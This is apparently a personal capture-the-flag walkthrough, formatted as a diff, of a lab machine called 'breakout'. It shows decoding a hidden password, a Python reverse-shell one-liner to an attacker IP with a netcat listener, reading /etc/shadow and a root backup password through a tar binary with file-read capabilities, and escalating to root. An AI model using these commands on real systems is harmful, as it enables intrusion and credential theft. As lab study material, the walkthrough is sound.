@@ -1,0 +1,132 @@
+
+
+in the source code of webpage
+<!--
+don't worry no one will get here, it's safe to share with you my access. Its encrypted :)
+
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
+
+
+-->
+
+This is an esteric, minimal language called Brainfuck.
+How Brainfuck works (brief)
+
+Brainfuck uses a tape of numeric cells and a data pointer. Commands:
+/ - : increment/decrement current cell
+/ < : move pointer
+
+[ / ] : loop while current cell non-zero
+. : output current cell as a character
+The initial loop (++++++++++[>+>+++>+++++++>++++++++++<<<<-]) is a common “setup” that seeds several cells with multiples used to build characters quickly. The rest prints characters from those cells and small adjustments.
+
+decodes to
+.2uqPEfj3D<P'a-3
+
+There are supposed to be smb shares, which we would enumerate or use enum4linux to find the user cyber
+
+In this case... I believe something is wrong with the box? As these have not existed.
+
+we get logged into Usermin on port 20000
+username cyber
+
+System hostname 	breakout
+Operating system 	Debian Linux 11
+Usermin Version 	1.830
+Authentic theme version 	19.83-2
+Time on system 	10/08/2025 10:27:37 PM
+
+Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)                        | linux/webapps/50234.py
+
+Instead, we will just use the Command Shell module.
+
+python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("192.168.45.210",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444                               
+listening on [any] 4444 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.206.238] 52942
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+
+cyber@breakout:~$ ls -lsa
+total 568
+  4 drwxr-xr-x  8 cyber cyber   4096 Oct 30  2024 .
+  4 drwxr-xr-x  3 root  root    4096 Oct 19  2021 ..
+  0 lrwxrwxrwx  1 root  root       9 Oct 30  2024 .bash_history -> /dev/null
+  4 -rw-r--r--  1 cyber cyber    220 Oct 19  2021 .bash_logout
+  4 -rw-r--r--  1 cyber cyber   3526 Oct 19  2021 .bashrc
+  4 drwxr-xr-x  2 cyber cyber   4096 Oct 19  2021 .filemin
+  4 drwx------  2 cyber cyber   4096 Oct 19  2021 .gnupg
+  4 drwxr-xr-x  3 cyber cyber   4096 Oct 19  2021 .local
+  4 -rw-r--r--  1 root  root      33 Oct  8 22:01 local.txt
+  4 -rw-r--r--  1 cyber cyber    807 Oct 19  2021 .profile
+  4 drwx------  2 cyber cyber   4096 Oct 19  2021 .spamassassin
+520 -rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar
+  4 drwxr-xr-x  2 cyber cyber   4096 Oct 20  2021 .tmp
+  4 drwx------ 16 cyber cyber   4096 Oct 19  2021 .usermin
+
+cyber@breakout:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/fusermount
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+cyber@breakout:~$ 
+
+cyber@breakout:~$ getcap -r / 2>/dev/null | grep -i 'cap_dac_read_search\|cap_' || echo "no getcap or no capabilities found"
+/home/cyber/tar cap_dac_read_search=ep
+/usr/bin/ping cap_net_raw=ep
+cyber@breakout:~$ 
+
+
+ it lets the tar process bypass normal DAC checks and read files you normally can’t. You can use that tar binary to read /etc/shadow, root SSH keys, sudoers, web config files, etc., without needing to escalate first.
+
+What it means (short)
+
+cap_dac_read_search+ep on a binary means when that binary runs, it can read/search files regardless of normal file permissions (for reads/searches only).
+You need a binary that actually reads files you care about — tar is perfect because it can include arbitrary files into an archive.
+
+cyber@breakout:~$ /home/cyber/tar -cf - -C / etc/shadow | tar -xOf - etc/shadow
+root:$y$j9T$eJzu0TYuqGwZThJJzbP6o.$Xs23PV9/MdV33YMgceRv1Ic6anL08XclYLE9UX1WiJ6:19381:0:99999:7:::
+...
+messagebus:*:18919:0:99999:7:::
+cyber:$y$j9T$x6sDj5S/H0RH4IGhi0c6x0$mIPyCIactTA3/gxTaI7zctfCt2.EOGXTOW4X9efAVW4:18919:0:99999:7:::
+systemd-coredump:!*:18919::::::
+cyber@breakout:~$ 
+
+unable to unshadow/cracl
+
+cyber@breakout:/var/backups$ ls -lsa
+total 484
+  4 drwxr-xr-x  2 root root   4096 Dec  8  2022 .
+  4 drwxr-xr-x 14 root root   4096 Oct 19  2021 ..
+ 40 -rw-r--r--  1 root root  40960 Dec  8  2022 alternatives.tar.0
+ 16 -rw-r--r--  1 root root  12674 Nov 17  2022 apt.extended_states.0
+  4 -rw-r--r--  1 root root   1467 Oct 19  2021 apt.extended_states.1.gz
+  0 -rw-r--r--  1 root root      0 Dec  8  2022 dpkg.arch.0
+  4 -rw-r--r--  1 root root    186 Oct 19  2021 dpkg.diversions.0
+  4 -rw-r--r--  1 root root    135 Oct 19  2021 dpkg.statoverride.0
+404 -rw-r--r--  1 root root 413488 Oct 19  2021 dpkg.status.0
+  4 -rw-------  1 root root     17 Oct 20  2021 .old_pass.bak
+cyber@breakout:/var/backups$ 
+
+cyber@breakout:/var/backups$ /home/cyber/tar -cf - .old_pass.bak | tar -xOf - .old_pass.bak
+Ts&4&YurgtRX(=~h
+cyber@breakout:/var/backups$ 
+cyber@breakout:/var/backups$ su root
+Password: 
+root@breakout:/var/backups# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
